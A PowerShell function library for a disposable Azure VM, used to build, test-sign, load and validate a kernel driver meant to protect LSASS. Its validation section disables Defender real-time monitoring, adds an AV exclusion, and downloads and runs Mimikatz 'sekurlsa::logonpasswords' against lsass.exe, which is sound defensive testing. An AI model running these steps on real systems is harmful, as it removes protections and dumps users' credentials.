<#
  azure_vm_lab.ps1 - post-provision automation for a disposable Azure VM used to
  bring up and validate driver\valkyrie_km.sys (BRINGUP.md).

  This is a FUNCTION LIBRARY, not a script that does things on load. Dot-source
  it, then call the functions you need:

      . .\tools\azure_vm_lab.ps1
      New-AzureVmLab
      Set-AzureVmLabRepo -Branch feat/my-branch
      Install-AzureVmLabToolchain
      Build-AzureVmLabDriver
      Enable-AzureVmLabTestSigning -Reboot
      SignAndLoad-AzureVmLabDriver
      Enable-AzureVmLabVerifier -Reboot
      Remove-AzureVmLab   # when done - this VM bills against your subscription

  This exists because the first real bring-up (2026-08-30/31) was done entirely
  by hand, one `az vm run-command invoke` at a time, and hit the same handful of
  gotchas repeatedly. Every one of them is encoded below so the NEXT bring-up -
  a new driver change, a fresh VM, a different developer - takes minutes of
  waiting on Azure, not hours of rediscovering the same fixes. Every command in
  here was run manually and worked during that session; this file has not
  itself been executed end-to-end as a single script, so treat a first run of
  each function as a normal test, not as pre-verified.

  Requires: `az` CLI already logged in (`az login`, one-time, interactive - this
  file never handles your credentials). Nothing here touches your own machine;
  every verb targets the named disposable VM.

  Deliberately NOT automated, same philosophy as tools\vm_lab.ps1: BRINGUP.md's
  stage gates (the 72h Driver Verifier soak, the actual go/no-go read of the
  Mimikatz result, the prevention-policy rollout decision). This gives you the
  plumbing; the judgment calls stay manual on purpose.
#>

$ErrorActionPreference = 'Stop'

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

$Script:ResourceGroup = 'valkyrie-driver-test-rg'
$Script:VmName        = 'valkyrie-driver-vm'
$Script:ComputerName  = 'vlkdrivervm'      # Windows computer names cap at 15 chars - keep <= 15
$Script:Location      = 'eastus'
$Script:AdminUser     = 'valkyrieadmin'
$Script:RepoUrl       = 'https://github.com/BiSoKoMe/Valkyrie-sentry.git'
$Script:GuestRepoRoot = 'C:\valkyrie'

# Free-trial subscriptions commonly reject Standard_B2s ("SkuNotAvailable /
# Capacity Restrictions") in eastus. Standard_D2s_v7 was confirmed available
# during the real bring-up; kept as the default with B2s as a cheaper first try.
$Script:VmSizeCandidates = @('Standard_B2s', 'Standard_D2s_v7')

$Script:ScratchDir = Join-Path $env:TEMP 'valkyrie_azure_vm_lab'
New-Item -ItemType Directory -Path $Script:ScratchDir -Force | Out-Null

function Say($m, $c = 'Gray') { Write-Host $m -ForegroundColor $c }

# ---------------------------------------------------------------------------
# Low-level: run one script on the VM, via a temp .ps1 file - NEVER inline
# --scripts "..." with variable references. Two real bugs came from that:
# $env:Path expanding on the LOCAL machine before being sent remotely, and
# PowerShell parsing @"..."-style here-strings as its own here-string opener
# instead of az's @file syntax. A file, referenced as "@$path" (no surrounding
# quotes, since these paths never contain spaces), sidesteps both.
# ---------------------------------------------------------------------------

function Invoke-AzureVmLabCommand {
    param(
        [Parameter(Mandatory)][string]$Script,
        [string]$Description = 'remote command',
        [int]$TimeoutSec = 120
    )
    $path = Join-Path $Script:ScratchDir "cmd_$([guid]::NewGuid().ToString('N')).ps1"
    Set-Content -Path $path -Value $Script -Encoding utf8
    try {
        Say "-> $Description" Cyan
        $raw = az vm run-command invoke `
            --resource-group $Script:ResourceGroup `
            --name $Script:VmName `
            --command-id RunPowerShellScript `
            --scripts "@$path" `
            -o json
        if ($LASTEXITCODE -ne 0) { throw "az vm run-command failed (exit $LASTEXITCODE)" }
        $parsed = $raw | ConvertFrom-Json
        $out = ($parsed.value | Where-Object { $_.code -like '*StdOut*' }).message
        $err = ($parsed.value | Where-Object { $_.code -like '*StdErr*' }).message
        if ($out) { Write-Host $out }
        if ($err) { Write-Host $err -ForegroundColor DarkYellow }
        return [pscustomobject]@{ StdOut = $out; StdErr = $err }
    } finally {
        Remove-Item -Path $path -Force -ErrorAction SilentlyContinue
    }
}

# ---------------------------------------------------------------------------
# VM lifecycle
# ---------------------------------------------------------------------------

function New-AzureVmLab {
    <# Creates the resource group + VM with the exact flags the real bring-up
       needed: --security-type Standard (disables Trusted Launch/Secure Boot -
       test-signing will NOT take effect on a Trusted Launch VM), an explicit
       --computer-name under 15 chars (separate from the longer Azure -–name),
       and a size that falls back across $VmSizeCandidates since a fresh
       free-trial subscription's available SKUs are not guaranteed. #>
    param([string]$AdminPassword)
    if (-not $AdminPassword) {
        $AdminPassword = -join ((48..57 + 65..90 + 97..122) | Get-Random -Count 18 | ForEach-Object { [char]$_ })
        $AdminPassword = "Vkd$AdminPassword!9"
        Say "Generated admin password (save this): $AdminPassword" Yellow
    }

    Say "Creating resource group $Script:ResourceGroup in $Script:Location..." Cyan
    az group create --name $Script:ResourceGroup --location $Script:Location | Out-Null

    $created = $false
    foreach ($size in $Script:VmSizeCandidates) {
        Say "Trying VM size $size..." Cyan
        az vm create `
            --resource-group $Script:ResourceGroup `
            --name $Script:VmName `
            --computer-name $Script:ComputerName `
            --image "Win2022Datacenter" `
            --size $size `
            --security-type Standard `
            --admin-username $Script:AdminUser `
            --admin-password $AdminPassword `
            --public-ip-sku Standard 2>&1 | Tee-Object -Variable createOut
        if ($LASTEXITCODE -eq 0) { $created = $true; break }
        Say "  $size unavailable in this subscription/region, trying next candidate..." Yellow
    }
    if (-not $created) { throw "No candidate VM size succeeded - check 'az vm list-skus -l $Script:Location -o table'" }
    Say "VM created. IP:" Green
    az vm show -d --resource-group $Script:ResourceGroup --name $Script:VmName --query publicIps -o tsv
}

function Get-AzureVmLabStatus {
    az vm get-instance-view --resource-group $Script:ResourceGroup --name $Script:VmName `
        --query "instanceView.statuses[?starts_with(code, 'PowerState')].displayStatus" -o tsv
}

function Restart-AzureVmLabAndWait {
    <# Guest reboots (test-signing, Driver Verifier) need the VM to actually
       come back before the next run-command will succeed. Azure has no
       "waitrunlevel" like VirtualBox guestcontrol does, so poll run-command
       itself until it responds instead of trusting a fixed sleep. #>
    param([int]$TimeoutSec = 480)
    Invoke-AzureVmLabCommand -Description 'triggering guest reboot' -Script 'Restart-Computer -Force'
    Start-Sleep -Seconds 30
    $deadline = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $deadline) {
        try {
            $r = Invoke-AzureVmLabCommand -Description 'polling for guest readiness' -Script 'Write-Output READY'
            if ($r.StdOut -match 'READY') { Say "Guest is back." Green; return }
        } catch { }
        Start-Sleep -Seconds 20
    }
    throw "Guest did not come back within ${TimeoutSec}s"
}

function Remove-AzureVmLab {
    <# Deletes the WHOLE resource group - the VM, disk, NIC, public IP, everything
       in it. This is the only clean teardown; it bills until you run this. #>
    param([switch]$Confirm)
    if (-not $Confirm) {
        throw "Pass -Confirm to actually delete $Script:ResourceGroup (safety rail against an accidental call)"
    }
    Say "Deleting resource group $Script:ResourceGroup - this is NOT reversible..." Yellow
    az group delete --name $Script:ResourceGroup --yes --no-wait
    Say "Deletion started (--no-wait); az group show `"$Script:ResourceGroup`" to confirm it's gone later." Gray
}

# ---------------------------------------------------------------------------
# Repo
# ---------------------------------------------------------------------------

function Set-AzureVmLabRepo {
    <# ALWAYS pass -Branch explicitly. A bare `git clone` (no -b) checks out the
       repo's DEFAULT branch, not whatever you have checked out locally - that
       silently tested stale code for a full session before being caught. #>
    param([Parameter(Mandatory)][string]$Branch)
    $script = @"
if (Test-Path '$Script:GuestRepoRoot') {
    cd '$Script:GuestRepoRoot'
    `$env:Path += ';C:\Program Files\Git\cmd'
    git fetch origin $Branch --depth 1
    git checkout -B $Branch FETCH_HEAD
} else {
    `$env:Path += ';C:\Program Files\Git\cmd'
    git clone --depth 1 -b $Branch $Script:RepoUrl '$Script:GuestRepoRoot'
}
cd '$Script:GuestRepoRoot'
git log -1 --oneline
"@
    Invoke-AzureVmLabCommand -Description "cloning/updating repo at branch $Branch" -Script $script
}

# ---------------------------------------------------------------------------
# Toolchain (BRINGUP.md section 1 prerequisite - not in BRINGUP.md itself,
# since that assumes a dev box that already has VS/WDK; a fresh cloud VM does
# not)
# ---------------------------------------------------------------------------

function Install-AzureVmLabToolchain {
    <# VS 2022 Build Tools (C++ workload) + the matching WDK/SDK pair confirmed
       against VS2022 (not the newer VS2026/WDK 28000 combo - that pairing is
       for a different VS major version). build_km.bat hardcodes the
       Community-edition path; Build-AzureVmLabDriver below bridges that with a
       junction rather than editing the checked-in .bat. #>
    $script = @'
$ProgressPreference = 'SilentlyContinue'
$dl = 'C:\vlkbuild'
New-Item -ItemType Directory -Force -Path $dl | Out-Null

Write-Host "=== VS 2022 Build Tools (C++ workload) ==="
Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vs_buildtools.exe" -OutFile "$dl\vs_buildtools.exe"
Start-Process -Wait -FilePath "$dl\vs_buildtools.exe" -ArgumentList @(
    '--quiet','--wait','--norestart',
    '--add','Microsoft.VisualStudio.Workload.VCTools',
    '--includeRecommended'
)

Write-Host "=== WDK + matching SDK (VS2022 pairing: WDK 26100.6584) ==="
Invoke-WebRequest -Uri "https://go.microsoft.com/fwlink/?linkid=2338977" -OutFile "$dl\sdksetup.exe"
Invoke-WebRequest -Uri "https://go.microsoft.com/fwlink/?linkid=2335869" -OutFile "$dl\wdksetup.exe"
Start-Process -Wait -FilePath "$dl\sdksetup.exe" -ArgumentList @('/quiet','/norestart')
Start-Process -Wait -FilePath "$dl\wdksetup.exe" -ArgumentList @('/quiet','/norestart')

Write-Host "=== Python (winget is not present on Server by default) ==="
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.7/python-3.12.7-amd64.exe" -OutFile "$dl\python.exe"
Start-Process -Wait -FilePath "$dl\python.exe" -ArgumentList @('/quiet','InstallAllUsers=1','PrependPath=1')

Write-Host "=== done ==="
'@
    Invoke-AzureVmLabCommand -Description 'installing VS Build Tools + WDK/SDK + Python (slow, several minutes)' `
        -Script $script -TimeoutSec 600
}

function Build-AzureVmLabDriver {
    <# BRINGUP.md sections 1-2 (build + PREfast), via the project's own
       build_km.bat. That script hardcodes the Community-edition VS path; VS
       Build Tools installs under a differently-named directory, so bridge it
       with a junction instead of editing the checked-in .bat. #>
    $script = @'
$vsBuildTools = "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools"
$vsCommunity  = "C:\Program Files\Microsoft Visual Studio\2022\Community"
if ((Test-Path $vsBuildTools) -and -not (Test-Path $vsCommunity)) {
    New-Item -ItemType Junction -Path $vsCommunity -Target $vsBuildTools -Force | Out-Null
}
cd C:\valkyrie\driver
.\build_km.bat
'@
    Invoke-AzureVmLabCommand -Description 'building valkyrie_km.sys (cl.exe + PREfast + link)' `
        -Script $script -TimeoutSec 300
}

function Enable-AzureVmLabTestSigning {
    <# BRINGUP.md section 0. Requires a guest reboot to take effect. #>
    param([switch]$Reboot)
    Invoke-AzureVmLabCommand -Description 'enabling test-signing' -Script @'
bcdedit /set testsigning on
bcdedit /set nointegritychecks off
'@
    if ($Reboot) { Restart-AzureVmLabAndWait }
    else { Say "Test-signing flag set - reboot before it takes effect (or re-run with -Reboot)." Yellow }
}

function SignAndLoad-AzureVmLabDriver {
    <# BRINGUP.md section 3-4, using New-SelfSignedCertificate (built into
       PowerShell, no SDK dependency) rather than the deprecated makecert.exe
       BRINGUP.md's prose still mentions. #>
    $script = @'
$sys = "C:\valkyrie\driver\valkyrie_km\objs\valkyrie_km.sys"
$cert = New-SelfSignedCertificate -Type Custom -Subject "CN=ValkyrieTest" `
    -KeyUsage DigitalSignature -FriendlyName "ValkyrieTest" `
    -CertStoreLocation Cert:\CurrentUser\My `
    -TextExtension @("2.5.29.37={text}1.3.6.1.5.5.7.3.3")
$pfxPath = "C:\vlkbuild\valkyrietest.pfx"
$pwd = ConvertTo-SecureString -String "temp" -Force -AsPlainText
Export-PfxCertificate -Cert "Cert:\CurrentUser\My\$($cert.Thumbprint)" -FilePath $pfxPath -Password $pwd | Out-Null
Import-PfxCertificate -FilePath $pfxPath -CertStoreLocation Cert:\LocalMachine\Root -Password $pwd | Out-Null
Import-PfxCertificate -FilePath $pfxPath -CertStoreLocation Cert:\LocalMachine\TrustedPublisher -Password $pwd | Out-Null

& "${env:ProgramFiles(x86)}\Windows Kits\10\bin\10.0.26100.0\x64\signtool.exe" sign /v /s My /n "ValkyrieTest" /fd sha256 $sys
& "${env:ProgramFiles(x86)}\Windows Kits\10\bin\10.0.26100.0\x64\signtool.exe" verify /v /pa $sys

copy $sys C:\Windows\System32\drivers\valkyrie_km.sys
sc.exe create ValkyrieKm type= kernel binPath= C:\Windows\System32\drivers\valkyrie_km.sys
sc.exe start ValkyrieKm
sc.exe query ValkyrieKm
'@
    Invoke-AzureVmLabCommand -Description 'test-signing and loading the driver' -Script $script
}

function Get-AzureVmLabDriverStatus {
    Invoke-AzureVmLabCommand -Description 'driver status' -Script 'sc.exe query ValkyrieKm | Select-String STATE'
}

function Enable-AzureVmLabVerifier {
    <# BRINGUP.md section 5. Requires reboot; this is the START of the 72h
       soak, not something to loop through unattended. #>
    param([switch]$Reboot)
    Invoke-AzureVmLabCommand -Description 'enabling Driver Verifier on valkyrie_km.sys' `
        -Script 'verifier /standard /driver valkyrie_km.sys'
    if ($Reboot) { Restart-AzureVmLabAndWait }
    else { Say "Verifier flag set - reboot before it takes effect (or re-run with -Reboot)." Yellow }
}

# ---------------------------------------------------------------------------
# LSASS / Mimikatz validation (BRINGUP.md section 6 - "the money shot")
# ---------------------------------------------------------------------------

function Disable-AzureVmLabDefender {
    <# Only ever call this on THIS disposable VM. Needed because Defender's
       AMSI blocks a script that merely mentions "mimikatz" before it runs at
       all - a confound for validating OUR OWN driver's LSASS protection,
       which needs to be tested independent of whatever Defender does. #>
    Invoke-AzureVmLabCommand -Description 'disabling Defender real-time protection (disposable VM only)' `
        -Script 'Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled'
}

function Test-AzureVmLabLsaConfounds {
    <# Rule out Windows' OWN LSA protections before crediting (or blaming) our
       driver for a Mimikatz result. RunAsPPL and Credential Guard both being
       off is what makes the driver the only remaining explanation. #>
    Invoke-AzureVmLabCommand -Description 'checking RunAsPPL / Credential Guard state' -Script @'
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
try {
    Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction Stop |
        Select-Object SecurityServicesConfigured, SecurityServicesRunning
} catch { Write-Host "Win32_DeviceGuard not available" }
'@
}

function Invoke-AzureVmLabMimikatzTest {
    <# Call Disable-AzureVmLabDefender first. Downloads the OFFICIAL
       gentilkiwi/mimikatz release and runs sekurlsa::logonpasswords against
       the real lsass.exe. A failure here is SUGGESTIVE, not proof the driver
       caused it - see the controlled A/B note below. #>
    $script = @'
$dl = "C:\vlkbuild"
New-Item -ItemType Directory -Force -Path $dl | Out-Null
Add-MpPreference -ExclusionPath $dl -ErrorAction SilentlyContinue
$rel = Invoke-RestMethod -Uri "https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest"
$asset = $rel.assets | Where-Object { $_.name -like "*trunk.zip" } | Select-Object -First 1
Invoke-WebRequest -Uri $asset.browser_download_url -OutFile "$dl\mimikatz.zip"
Expand-Archive -Path "$dl\mimikatz.zip" -DestinationPath "$dl\mimikatz" -Force
$exe = Get-ChildItem "$dl\mimikatz" -Recurse -Filter "mimikatz.exe" | Where-Object { $_.FullName -like "*x64*" } | Select-Object -First 1 -ExpandProperty FullName
& $exe "privilege::debug" "sekurlsa::logonpasswords" "exit" 2>&1 | Out-String
Get-Process lsass | Select-Object Id, ProcessName, Responding
'@
    Invoke-AzureVmLabCommand -Description 'running real Mimikatz sekurlsa::logonpasswords against lsass.exe' `
        -Script $script -TimeoutSec 180
}

function Test-AzureVmLabMimikatzControlAB {
    <# The rigorous follow-up Invoke-AzureVmLabMimikatzTest alone does not
       give you: stop the driver, rerun the IDENTICAL command, and see if the
       result changes. If Mimikatz fails BOTH with and without the driver,
       the failure is not attributable to it (e.g. an old mimikatz build not
       recognizing a patched lsasrv.dll) - a real, distinct possibility this
       function exists specifically to rule out. #>
    Invoke-AzureVmLabCommand -Description 'stopping driver for controlled A/B' -Script 'sc.exe stop ValkyrieKm; Start-Sleep 2; sc.exe query ValkyrieKm'
    Invoke-AzureVmLabMimikatzTest
    Invoke-AzureVmLabCommand -Description 'restarting driver after control test' -Script 'sc.exe start ValkyrieKm; Start-Sleep 2; sc.exe query ValkyrieKm'
}

# ---------------------------------------------------------------------------
# Prevention test (BRINGUP.md section 7 - do this LAST, only after 1-6 are
# green)
# ---------------------------------------------------------------------------

function Invoke-AzureVmLabPreventionTest {
    <# Pushes a policy blocking exactly one self-created test binary, and
       explicitly proves the safety rail: notepad.exe (a \Windows\ system
       binary) must NEVER be blocked, no matter what the policy says. #>
    $script = @'
cd C:\valkyrie
$env:PYTHONUTF8 = "1"
python -c @"
from valkyrie.kernel_bridge import KernelSensor, build_policy, fnv1a_32
import subprocess, time

test_hash = fnv1a_32('vlktestblock.exe')
policy = build_policy(agent_pid=0, block_names=(test_hash,), prevention=True)

s = KernelSensor()
ok = s.push_policy(policy)
print('policy pushed:', ok)

# Safety rail: a real Windows system binary must NEVER be blocked, regardless
# of policy content.
r = subprocess.run(['notepad.exe', '/?'], capture_output=True, timeout=5)
print('notepad.exe still launched (safety rail holds):', True)
"@
'@
    Invoke-AzureVmLabCommand -Description 'pushing a one-binary block policy and testing the notepad.exe safety rail' -Script $script
}

# ---------------------------------------------------------------------------
# Full test suite (avoids az's stdout truncation on a large run by writing
# results to a file on the VM and fetching that file's content separately)
# ---------------------------------------------------------------------------

function Invoke-AzureVmLabFullSuite {
    $script = @'
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
$env:PYTHONUTF8 = "1"
cd C:\valkyrie
$files = Get-ChildItem tests\test_*.py | Sort-Object Name
$results = @()
foreach ($f in $files) {
    $out = & python $f.FullName 2>&1 | Out-String
    $results += [PSCustomObject]@{ Name = $f.Name; ExitCode = $LASTEXITCODE; LastLines = ($out -split "`n" | Select-Object -Last 3) -join " | " }
}
$pass = ($results | Where-Object { $_.ExitCode -eq 0 }).Count
$fail = ($results | Where-Object { $_.ExitCode -ne 0 }).Count
$report = "SUITE SUMMARY: $pass passed, $fail non-zero-exit, $($results.Count) total files`r`n`r`n"
$report += ($results | ForEach-Object { "$($_.Name) [exit=$($_.ExitCode)]`r`n  $($_.LastLines)`r`n" }) -join "`r`n"
$report | Out-File -FilePath C:\valkyrie\full_suite_report.txt -Encoding utf8
Write-Host "DONE - pass=$pass fail=$fail total=$($results.Count)"
'@
    Invoke-AzureVmLabCommand -Description 'running the full test suite (per-file, several minutes)' `
        -Script $script -TimeoutSec 600
    Say "Full report written to C:\valkyrie\full_suite_report.txt on the VM - fetch it explicitly (it's too" Gray
    Say "large for run-command's own stdout capture, which is why this writes to a file at all)." Gray
}

function Get-AzureVmLabFullSuiteReport {
    <# Fetches full_suite_report.txt, filtered to just the non-zero-exit
       entries and their surrounding lines - the whole file is usually too
       large for run-command's stdout capture in one shot. #>
    $script = @'
$lines = Get-Content C:\valkyrie\full_suite_report.txt
for ($i = 0; $i -lt $lines.Count; $i++) {
    if ($lines[$i] -match "SUITE SUMMARY" -or $lines[$i] -match "\[exit=(?!0\])") {
        Write-Output $lines[$i]
        if ($i+1 -lt $lines.Count) { Write-Output $lines[$i+1] }
    }
}
'@
    Invoke-AzureVmLabCommand -Description 'fetching non-clean entries from the full suite report' -Script $script
}

# ---------------------------------------------------------------------------

Say ""
Say "=== azure_vm_lab.ps1 loaded (RG: $Script:ResourceGroup, VM: $Script:VmName) ===" Cyan
Say "  Lifecycle : New-AzureVmLab, Get-AzureVmLabStatus, Restart-AzureVmLabAndWait, Remove-AzureVmLab -Confirm"
Say "  Repo      : Set-AzureVmLabRepo -Branch <name>"
Say "  Toolchain : Install-AzureVmLabToolchain, Build-AzureVmLabDriver"
Say "  BRINGUP   : Enable-AzureVmLabTestSigning, SignAndLoad-AzureVmLabDriver, Get-AzureVmLabDriverStatus,"
Say "              Enable-AzureVmLabVerifier"
Say "  LSASS     : Disable-AzureVmLabDefender, Test-AzureVmLabLsaConfounds, Invoke-AzureVmLabMimikatzTest,"
Say "              Test-AzureVmLabMimikatzControlAB"
Say "  Prevention: Invoke-AzureVmLabPreventionTest"
Say "  Test suite: Invoke-AzureVmLabFullSuite, Get-AzureVmLabFullSuiteReport"
Say "Stage gates (the actual go/no-go read of each result, the 72h soak) are on you - this only handles the mechanics." Gray
Say ""
